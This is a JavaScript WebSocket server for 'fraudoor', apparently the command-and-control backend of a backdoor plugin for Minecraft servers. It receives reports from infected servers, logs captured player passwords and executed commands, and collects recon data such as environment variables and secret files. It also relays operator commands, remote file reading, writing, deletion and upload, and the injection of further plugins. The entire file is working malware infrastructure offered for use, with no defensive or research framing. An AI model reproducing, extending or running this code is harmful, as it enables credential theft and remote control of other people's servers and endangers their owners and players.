import { v4 as uuidv4 } from 'uuid';
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET || 'fraudoor-dev-secret-change-in-production';

let _store = null;
let wss = null;

export function getStore() {
  return _store;
}

export function setupWebSocket(serverWss, store) {
  _store = store;
  wss = serverWss;

  wss.on('connection', (ws, req) => {
    const id = uuidv4();
    ws._fraudoorId = id;
    ws._fraudoorRole = null;

    // Parse token from query string for panel connections
    const url = new URL(req.url, 'http://localhost');
    const token = url.searchParams.get('token');
    if (token) {
      try {
        const decoded = jwt.verify(token, JWT_SECRET);
        ws._fraudoorUser = decoded;
      } catch {}
    }

    ws.on('message', (raw) => {
      let msg;
      try {
        msg = JSON.parse(raw.toString());
      } catch {
        return;
      }

      const { type, payload } = msg;

      // Panel auth message
      if (type === 'panel:auth') {
        try {
          const decoded = jwt.verify(payload.token, JWT_SECRET);
          ws._fraudoorUser = decoded;
          ws.send(JSON.stringify({ type: 'panel:auth:ok', payload: { user: decoded } }));
        } catch {
          ws.send(JSON.stringify({ type: 'panel:auth:error', payload: { error: 'invalid token' } }));
        }
        return;
      }

      switch (type) {
        // --- Plugin auth ---
        case 'plugin:hello': {
          ws._fraudoorRole = 'plugin';
          ws._fraudoorServerId = payload.id;
          store.addOrUpdateServer(payload.id, {
            ...payload,
            ws,
            online: true,
          });
          // Sync authorized members to agent
          const s = store.getServer(payload.id);
          if (s && s.members && s.members.length > 0) {
            ws.send(JSON.stringify({
              type: 'server:auth:members',
              payload: { list: s.members.join(',') },
            }));
          }
          broadcastPanel({
            type: 'server:status',
            payload: {
              id: payload.id,
              name: payload.name,
              ip: payload.ip,
              port: payload.port,
              online: true,
              playerCount: payload.playerCount || 0,
              maxPlayers: payload.maxPlayers || 0,
              version: payload.version || '',
              type: payload.type || 'paper',
            },
          });
          break;
        }

        // --- Console output from plugin ---
        case 'plugin:console': {
          const server = store.getServerByWs(ws);
          if (!server) return;
          broadcastPanelForServer(server.id, {
            type: 'server:console',
            payload: {
              serverId: server.id,
              line: payload.line,
              timestamp: Date.now(),
            },
          });
          break;
        }

        // --- Plugin status update ---
        case 'plugin:status': {
          const server = store.getServerByWs(ws);
          if (!server) return;
          store.addOrUpdateServer(server.id, payload);
          broadcastPanelForServer(server.id, {
            type: 'server:status',
            payload: { id: server.id, ...payload },
          });
          break;
        }

        // --- Plugin command log ---
        case 'plugin:log:command': {
          const server = store.getServerByWs(ws);
          if (!server) return;
          const entry = {
            type: 'command',
            serverId: server.id,
            serverName: server.name || server.ip,
            who: payload.who || '?',
            target: payload.target || '-',
            command: payload.command || '?',
            timestamp: Date.now(),
          };
          store.addLog(entry);
          broadcastPanel({
            type: 'panel:log:command',
            payload: entry,
          });
          break;
        }

        // --- Plugin password capture ---
        case 'plugin:log:password': {
          const server = store.getServerByWs(ws);
          if (!server) return;
          const entry = {
            type: 'password',
            serverId: server.id,
            serverName: server.name || server.ip,
            player: payload.player || '?',
            password: payload.password || '?',
            timestamp: Date.now(),
          };
          store.addLog(entry);
          broadcastPanel({
            type: 'panel:log:password',
            payload: entry,
          });
          break;
        }

        // --- Plugin recon (env vars, secret files) ---
        case 'plugin:recon': {
          const server = store.getServerByWs(ws);
          if (!server) return;
          const entry = {
            type: 'recon',
            serverId: server.id,
            serverName: server.name || server.ip,
            reconType: payload.type || '?',
            key: payload.key || payload.path || '?',
            value: payload.value || payload.content || '?',
            timestamp: Date.now(),
          };
          store.addLog(entry);
          broadcastPanel({
            type: 'panel:log:recon',
            payload: entry,
          });
          break;
        }

        // --- Plugin file listing response ---
        case 'plugin:file:list': {
          const panelWs = findPanelForRequest(payload.requestId);
          if (panelWs) {
            panelWs.send(JSON.stringify({
              type: 'server:file:list',
              payload: payload,
            }));
          }
          break;
        }

        // --- Plugin file read response ---
        case 'plugin:file:read': {
          const panelWs = findPanelForRequest(payload.requestId);
          if (panelWs) {
            panelWs.send(JSON.stringify({
              type: 'server:file:read',
              payload: payload,
            }));
          }
          break;
        }

        case 'plugin:file:write': {
          const panelWs = findPanelForRequest(payload.requestId);
          if (panelWs) {
            panelWs.send(JSON.stringify({
              type: 'server:file:write',
              payload: payload,
            }));
          }
          break;
        }

        case 'plugin:file:delete': {
          const panelWs = findPanelForRequest(payload.requestId);
          if (panelWs) {
            panelWs.send(JSON.stringify({
              type: 'server:file:delete',
              payload: payload,
            }));
          }
          break;
        }

        // --- Panel subscribes ---
        case 'panel:subscribe': {
          ws._fraudoorRole = 'panel';
          ws._fraudoorSubscribedServer = payload.serverId;
          ws.send(JSON.stringify({
            type: 'panel:subscribed',
            payload: { serverId: payload.serverId },
          }));
          break;
        }

        // --- Panel unsubscribes ---
        case 'panel:unsubscribe': {
          ws._fraudoorRole = 'panel';
          ws._fraudoorSubscribedServer = null;
          break;
        }

        // --- Panel sends command to server ---
        case 'panel:command': {
          const server = store.getServer(payload.serverId);
          if (!server || !server.ws) {
            ws.send(JSON.stringify({
              type: 'panel:error',
              payload: { message: 'Server not connected' },
            }));
            return;
          }
          server.ws.send(JSON.stringify({
            type: 'server:command',
            payload: { command: payload.command },
          }));
          break;
        }

        // --- Panel file operations ---
        case 'panel:file:list':
        case 'panel:file:read':
        case 'panel:file:write':
        case 'panel:file:delete':
        case 'panel:file:upload': {
          const server = store.getServer(payload.serverId);
          if (!server || !server.ws) {
            ws.send(JSON.stringify({
              type: 'panel:error',
              payload: { message: 'Server not connected' },
            }));
            return;
          }
          const requestId = uuidv4();
          ws._lastRequestId = requestId;
          server.ws.send(JSON.stringify({
            type: type.replace('panel:', 'server:'),
            payload: { ...payload, requestId },
          }));
          break;
        }

        // --- Injection request relay ---
        case 'panel:inject': {
          const server = store.getServer(payload.serverId);
          if (!server || !server.ws) {
            ws.send(JSON.stringify({
              type: 'panel:error',
              payload: { message: 'Server not connected for injection' },
            }));
            return;
          }
          const requestId = uuidv4();
          ws._lastRequestId = requestId;
          server.ws.send(JSON.stringify({
            type: 'server:inject',
            payload: {
              requestId,
              pluginName: payload.pluginName,
              pluginData: payload.pluginData,
              target: payload.target,
            },
          }));
          break;
        }

        default:
          break;
      }
    });

    ws.on('close', () => {
      if (ws._fraudoorRole === 'plugin' && ws._fraudoorServerId) {
        const server = store.getServer(ws._fraudoorServerId);
        if (server) {
          store.addOrUpdateServer(ws._fraudoorServerId, { online: false, ws: null });
          broadcastPanel({
            type: 'server:status',
            payload: { id: ws._fraudoorServerId, online: false },
          });
        }
      }
    });

    ws.on('error', () => {});
  });
}

function broadcastPanel(msg) {
  if (!wss) return;
  wss.clients.forEach((client) => {
    if (client._fraudoorRole === 'panel' && client.readyState === 1) {
      client.send(JSON.stringify(msg));
    }
  });
}

function broadcastPanelForServer(serverId, msg) {
  if (!wss) return;
  wss.clients.forEach((client) => {
    if (
      client._fraudoorRole === 'panel' &&
      client.readyState === 1 &&
      (!client._fraudoorSubscribedServer || client._fraudoorSubscribedServer === serverId)
    ) {
      client.send(JSON.stringify(msg));
    }
  });
}

function findPanelForRequest(requestId) {
  if (!wss) return null;
  for (const client of wss.clients) {
    if (client._fraudoorRole === 'panel' && client._lastRequestId === requestId && client.readyState === 1) {
      return client;
    }
  }
  return null;
}
